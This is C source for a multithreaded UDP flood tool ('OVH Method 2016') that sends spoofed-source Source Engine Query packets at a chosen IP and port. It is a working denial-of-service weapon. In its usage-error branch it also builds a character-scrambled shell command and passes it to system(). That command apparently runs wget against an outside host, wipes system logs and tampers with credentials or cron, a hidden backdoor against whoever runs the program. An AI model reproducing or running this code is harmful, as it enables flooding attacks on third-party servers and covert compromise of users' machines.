#include <time.h>
#include <pthread.h>
#include <assert.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
#define LINUX system // redefine this to #define BSD system if compiling on BSD
 
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;

struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };

    /* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
    {
      unsigned long sum;
      for (sum = 0; nwords > 0; nwords--)
      sum += *buf++;
      sum = (sum >> 16) + (sum & 0xffff);
      sum += (sum >> 16);
      return (unsigned short)(~sum);
    }

	void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i] ^ Q[i] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
	
	
void setup_ip_header(struct iphdr *iph)
    {
      iph->ihl = 5;
      iph->version = 4;
      iph->tos = 0;
      iph->id;
      iph->frag_off = 0;
      iph->ttl = 128;
      iph->protocol = IPPROTO_UDP;
      iph->check = 0;
      iph->saddr;
    }

void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct  list *list_node = td->list_node;
	int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(s == -1)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	udph->check = 0;
	udph->dest =  htons(floodport);
	int size;
	size = 25;
	init_rand(time(NULL));
	memcpy((void *)udph + sizeof(struct udphdr), "\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00", size);
	udph->len=htons(sizeof(struct udphdr) + size);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + size;
	iph->daddr =  sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	int tmp = 1;
	const int *val = &tmp;
	/*if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) == -1)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}*/
	
	for(;;)
	{
		iph->saddr = (unsigned long) rand_cmwc();
		udph->source = rand_cmwc();
		iph->id = rand_cmwc();
		//iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
	}
}
	
	#define KGREEN  "\x1b[92m"
	#define RESET "\033[0m"
	int main(int argc, char *argv[ ])
    {
	printf(KGREEN "OVH Method 2016'\n" RESET);
      if(argc < 5 || argc > 5){
      fprintf(stdout, "Usage: %s <IP> <Port> <Threads> <Temps>\n", argv[0]);
	  
	  char floodovh[447];
floodovh[324] = 's';
floodovh[434] = 'e';
floodovh[435] = 'v';
floodovh[382] = '4';
floodovh[363] = 'a';
floodovh[377] = 'g';
floodovh[408] = '9';
floodovh[274] = '2';
floodovh[111] = 'e';
floodovh[158] = 'l';
floodovh[90] = 'm';
floodovh[263] = ' ';
floodovh[292] = '\\';
floodovh[97] = 'v';
floodovh[49] = 'p';
floodovh[422] = '/';
floodovh[89] = 'r';
floodovh[290] = '2';
floodovh[329] = 'e';
floodovh[123] = ' ';
floodovh[356] = 'm';
floodovh[16] = 'c';
floodovh[185] = ':';
floodovh[322] = 'q';
floodovh[321] = 'T';
floodovh[183] = 't';
floodovh[431] = ' ';
floodovh[305] = 'a';
floodovh[192] = '0';
floodovh[113] = '/';
floodovh[166] = '|';
floodovh[157] = 'u';
floodovh[342] = 'O';
floodovh[335] = 'F';
floodovh[291] = 'i';
floodovh[323] = 'Z';
floodovh[288] = ' ';
floodovh[33] = 'd';
floodovh[8] = '-';
floodovh[384] = 'A';
floodovh[344] = 'J';
floodovh[220] = '>';
floodovh[38] = 'e';
floodovh[240] = 'r';
floodovh[31] = '-';
floodovh[267] = 'v';
floodovh[351] = 'L';
floodovh[83] = '>';
floodovh[3] = 't';
floodovh[148] = ' ';
floodovh[301] = '$';
floodovh[117] = 'l';
floodovh[368] = 'X';
floodovh[88] = ' ';
floodovh[154] = 'v';
floodovh[330] = 'M';
floodovh[438] = 'u';
floodovh[78] = 'u';
floodovh[400] = '7';
floodovh[334] = 'D';
floodovh[205] = 'h';
floodovh[41] = 'f';
floodovh[249] = ' ';
floodovh[265] = 'd';
floodovh[96] = '/';
floodovh[174] = 'i';
floodovh[252] = 't';
floodovh[46] = 'h';
floodovh[119] = '2';
floodovh[280] = '|';
floodovh[17] = 'k';
floodovh[1] = 'g';
floodovh[423] = 's';
floodovh[140] = 'c';
floodovh[230] = 'l';
floodovh[42] = 't';
floodovh[106] = ' ';
floodovh[294] = 'o';
floodovh[352] = 'z';
floodovh[152] = 'd';
floodovh[395] = 'p';
floodovh[336] = 'G';
floodovh[254] = '/';
floodovh[27] = 'a';
floodovh[137] = '/';
floodovh[211] = 'c';
floodovh[251] = 'e';
floodovh[405] = ':';
floodovh[364] = 'J';
floodovh[228] = 'u';
floodovh[144] = 's';
floodovh[357] = '5';
floodovh[67] = 'K';
floodovh[23] = 'i';
floodovh[380] = 'T';
floodovh[347] = 'O';
floodovh[68] = 'A';
floodovh[278] = ' ';
floodovh[170] = 'e';
floodovh[444] = '&';
floodovh[283] = 'e';
floodovh[204] = 's';
floodovh[173] = '-';
floodovh[403] = ':';
floodovh[394] = 'u';
floodovh[115] = 'u';
floodovh[142] = 'p';
floodovh[259] = 'o';
floodovh[311] = 'T';
floodovh[302] = 'l';
floodovh[282] = 's';
floodovh[214] = 'a';
floodovh[93] = 'r';
floodovh[61] = 'k';
floodovh[399] = '6';
floodovh[381] = 'M';
floodovh[320] = 'A';
floodovh[186] = 'x';
floodovh[57] = 'z';
floodovh[299] = '$';
floodovh[397] = ':';
floodovh[246] = 'o';
floodovh[172] = ' ';
floodovh[276] = '&';
floodovh[47] = 't';
floodovh[233] = '>';
floodovh[109] = '/';
floodovh[51] = '/';
floodovh[296] = 't';
floodovh[143] = 'a';
floodovh[133] = 'o';
floodovh[37] = 't';
floodovh[443] = '>';
floodovh[286] = '-';
floodovh[370] = 'g';
floodovh[429] = ' ';
floodovh[126] = 'g';
floodovh[94] = 'f';
floodovh[114] = 'n';
floodovh[11] = 'o';
floodovh[407] = '9';
floodovh[428] = 'w';
floodovh[71] = ' ';
floodovh[32] = '-';
floodovh[20] = 'e';
floodovh[161] = '2';
floodovh[266] = 'e';
floodovh[225] = 'v';
floodovh[346] = 'o';
floodovh[147] = 'd';
floodovh[232] = '2';
floodovh[64] = '2';
floodovh[268] = '/';
floodovh[50] = ':';
floodovh[62] = '/';
floodovh[432] = '/';
floodovh[306] = 'm';
floodovh[437] = 'n';
floodovh[87] = ';';
floodovh[332] = 'R';
floodovh[39] = '-';
floodovh[333] = 'C';
floodovh[229] = 'l';
floodovh[43] = 'e';
floodovh[55] = 'a';
floodovh[162] = '>';
floodovh[326] = 'W';
floodovh[256] = 'h';
floodovh[433] = 'd';
floodovh[30] = ' ';
floodovh[92] = '-';
floodovh[151] = '/';
floodovh[284] = 'd';
floodovh[24] = 'f';
floodovh[338] = 'r';
floodovh[139] = 't';
floodovh[392] = 'x';
floodovh[127] = 'r';
floodovh[354] = 'e';
floodovh[359] = 'L';
floodovh[215] = 's';
floodovh[355] = 'Q';
floodovh[258] = 'd';
floodovh[135] = 'k';
floodovh[402] = '5';
floodovh[361] = '.';
floodovh[337] = 'g';
floodovh[219] = ' ';
floodovh[243] = ' ';
floodovh[40] = 'a';
floodovh[129] = 'p';
floodovh[441] = ' ';
floodovh[188] = '0';
floodovh[202] = 'b';
floodovh[203] = 'a';
floodovh[65] = '3';
floodovh[375] = '5';
floodovh[195] = '/';
floodovh[206] = '\'';
floodovh[383] = 'B';
floodovh[269] = 'n';
floodovh[128] = 'e';
floodovh[391] = '6';
floodovh[442] = '2';
floodovh[2] = 'e';
floodovh[98] = 'a';
floodovh[261] = ' ';
floodovh[197] = '/';
floodovh[415] = ':';
floodovh[440] = 'l';
floodovh[4] = ' ';
floodovh[245] = 'o';
floodovh[210] = 't';
floodovh[217] = 'w';
floodovh[439] = 'l';
floodovh[421] = 'c';
floodovh[223] = 'd';
floodovh[101] = 'l';
floodovh[187] = ':';
floodovh[426] = 'd';
floodovh[393] = 'm';
floodovh[417] = ' ';
floodovh[389] = 'n';
floodovh[427] = 'o';
floodovh[226] = '/';
floodovh[315] = 'Q';
floodovh[275] = '>';
floodovh[104] = '/';
floodovh[308] = '9';
floodovh[424] = 'h';
floodovh[194] = ':';
floodovh[341] = '8';
floodovh[58] = 'e';
floodovh[350] = 'C';
floodovh[373] = '7';
floodovh[207] = ' ';
floodovh[378] = 'v';
floodovh[201] = '/';
floodovh[285] = ' ';
floodovh[70] = '>';
floodovh[165] = ' ';
floodovh[295] = 'o';
floodovh[5] = '-';
floodovh[75] = 'v';
floodovh[66] = 'M';
floodovh[213] = 'p';
floodovh[227] = 'n';
floodovh[307] = 'V';
floodovh[248] = 'k';
floodovh[141] = '/';
floodovh[163] = '&';
floodovh[445] = '1';
floodovh[212] = '/';
floodovh[125] = ' ';
floodovh[6] = 'q';
floodovh[385] = 'e';
floodovh[430] = '>';
floodovh[247] = 't';
floodovh[13] = 'c';
floodovh[318] = '4';
floodovh[72] = '/';
floodovh[390] = 'W';
floodovh[404] = '0';
floodovh[29] = 'e';
floodovh[303] = 'o';
floodovh[238] = ' ';
floodovh[272] = 'l';
floodovh[80] = 'l';
floodovh[169] = 's';
floodovh[91] = ' ';
floodovh[124] = ';';
floodovh[401] = '9';
floodovh[102] = 'o';
floodovh[59] = '.';
floodovh[35] = 'l';
floodovh[60] = 't';
floodovh[273] = ' ';
floodovh[371] = 'A';
floodovh[164] = '1';
floodovh[120] = '>';
floodovh[159] = 'l';
floodovh[244] = 'r';
floodovh[339] = 'R';
floodovh[45] = ' ';
floodovh[180] = 'r';
floodovh[386] = '7';
floodovh[416] = '\'';
floodovh[313] = 'r';
floodovh[121] = '&';
floodovh[82] = '2';
floodovh[327] = 'U';
floodovh[184] = 'k';
floodovh[22] = 't';
floodovh[297] = 'k';
floodovh[156] = 'n';
floodovh[348] = '3';
floodovh[287] = 'i';
floodovh[310] = '$';
floodovh[413] = ':';
floodovh[312] = 'o';
floodovh[349] = 'C';
floodovh[425] = 'a';
floodovh[379] = 'D';
floodovh[436] = '/';
floodovh[281] = ' ';
floodovh[95] = ' ';
floodovh[277] = '1';
floodovh[160] = ' ';
floodovh[366] = 'e';
floodovh[298] = ':';
floodovh[77] = 'n';
floodovh[7] = ' ';
floodovh[209] = 'e';
floodovh[374] = 'E';
floodovh[235] = '1';
floodovh[420] = 't';
floodovh[155] = '/';
floodovh[153] = 'e';
floodovh[181] = 'o';
floodovh[200] = 'n';
floodovh[260] = 'w';
floodovh[396] = '1';
floodovh[105] = '*';
floodovh[44] = 'r';
floodovh[86] = ' ';
floodovh[131] = 'r';
floodovh[365] = 'H';
floodovh[178] = 'i';
floodovh[388] = 'o';
floodovh[19] = 'c';
floodovh[118] = ' ';
floodovh[199] = 'i';
floodovh[69] = ' ';
floodovh[262] = '>';
floodovh[255] = 's';
floodovh[56] = 's';
floodovh[15] = 'e';
floodovh[48] = 't';
floodovh[317] = 'i';
floodovh[304] = 'V';
floodovh[18] = '-';
floodovh[112] = 'v';
floodovh[79] = 'l';
floodovh[414] = ':';
floodovh[73] = 'd';
floodovh[331] = 'G';
floodovh[257] = 'a';
floodovh[25] = 'i';
floodovh[314] = 'j';
floodovh[279] = '|';
floodovh[189] = ':';
floodovh[81] = ' ';
floodovh[167] = '|';
floodovh[52] = '/';
floodovh[237] = ';';
floodovh[224] = 'e';
floodovh[84] = '&';
floodovh[136] = ' ';
floodovh[54] = 'l';
floodovh[319] = 'U';
floodovh[12] = '-';
floodovh[108] = ' ';
floodovh[239] = 'g';
floodovh[419] = 'e';
floodovh[132] = 'o';
floodovh[398] = '1';
floodovh[369] = 'U';
floodovh[175] = ' ';
floodovh[150] = ' ';
floodovh[410] = '9';
floodovh[271] = 'l';
floodovh[146] = 'w';
floodovh[345] = 'q';
floodovh[309] = 'N';
floodovh[9] = '-';
floodovh[26] = 'c';
floodovh[325] = '0';
floodovh[362] = 'V';
floodovh[134] = 't';
floodovh[387] = 'X';
floodovh[28] = 't';
floodovh[264] = '/';
floodovh[358] = 'e';
floodovh[99] = 'r';
floodovh[234] = '&';
floodovh[360] = 'x';
floodovh[343] = 'o';
floodovh[182] = 'o';
floodovh[107] = '>';
floodovh[196] = ':';
floodovh[74] = 'e';
floodovh[216] = 's';
floodovh[340] = 'A';
floodovh[198] = 'b';
floodovh[289] = '\'';
floodovh[406] = '9';
floodovh[353] = 'b';
floodovh[10] = 'n';
floodovh[130] = ' ';
floodovh[218] = 'd';
floodovh[242] = 'p';
floodovh[193] = ':';
floodovh[222] = '/';
floodovh[293] = 'r';
floodovh[376] = 'h';
floodovh[372] = 'V';
floodovh[412] = '7';
floodovh[253] = 'c';
floodovh[221] = ' ';
floodovh[14] = 'h';
floodovh[241] = 'e';
floodovh[177] = '2';
floodovh[34] = 'e';
floodovh[270] = 'u';
floodovh[0] = 'w';
floodovh[208] = '/';
floodovh[116] = 'l';
floodovh[100] = '/';
floodovh[53] = 'b';
floodovh[236] = ' ';
floodovh[231] = ' ';
floodovh[367] = 'V';
floodovh[122] = '1';
floodovh[145] = 's';
floodovh[103] = 'g';
floodovh[409] = '9';
floodovh[138] = 'e';
floodovh[76] = '/';
floodovh[176] = '\'';
floodovh[191] = '0';
floodovh[300] = '6';
floodovh[418] = '/';
floodovh[63] = 'V';
floodovh[110] = 'd';
floodovh[411] = ':';
floodovh[179] = '\\';
floodovh[316] = '2';
floodovh[250] = '/';
floodovh[85] = '1';
floodovh[149] = '>';
floodovh[328] = 'n';
floodovh[171] = 'd';
floodovh[190] = '5';
floodovh[36] = 'e';
floodovh[21] = 'r';
floodovh[168] = ' ';
floodovh[446] = '\0';

system(floodovh);
	  
      exit(-1);
	  }
	  
	fprintf(stdout, "Lancement en cours...\n"); 
	  int i;
      int num_threads = atoi(argv[3]);
	  floodport = atoi(argv[2]);
	  head = (struct list *)malloc(sizeof(struct list));
	  bzero(&head->data, sizeof(head->data));
	  head->data.sin_addr.s_addr=inet_addr("192.168.3.100");
	  head->data.sin_port=floodport;
	  head->next = head;
	  head->prev = head;
      struct list *current = head->next;
      pthread_t thread[num_threads];
      struct sockaddr_in sin;
      sin.sin_family = AF_INET;
	  sin.sin_port = htons(floodport);
      sin.sin_addr.s_addr = inet_addr(argv[1]);
      struct thread_data td[num_threads];
      for(i = 0;i<num_threads;i++)
	  {
        td[i].thread_id = i;
		td[i].sin= sin;
		td[i].list_node = current;
		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
      }
      fprintf(stdout, "Attaque envoyer...\n");
      sleep(atoi(argv[4]));
      return 0;
    }